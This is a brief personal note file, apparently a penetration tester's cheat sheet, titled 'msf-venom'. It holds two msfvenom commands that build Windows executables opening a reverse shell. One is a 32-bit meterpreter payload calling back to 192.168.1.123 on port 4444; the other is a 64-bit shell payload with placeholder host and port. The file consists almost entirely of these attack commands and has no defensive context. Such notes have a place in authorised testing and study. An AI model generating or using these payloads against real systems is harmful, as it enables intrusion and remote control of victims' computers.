---
id: mbap57vtwss2hlff1v8wsfm
title: msf-venom
desc: ''
updated: 1702841329924
created: 1702841290277
---


Example windows command

#x86
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.123 lport=4444 -f exe > reverse.exe
```

#x64
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```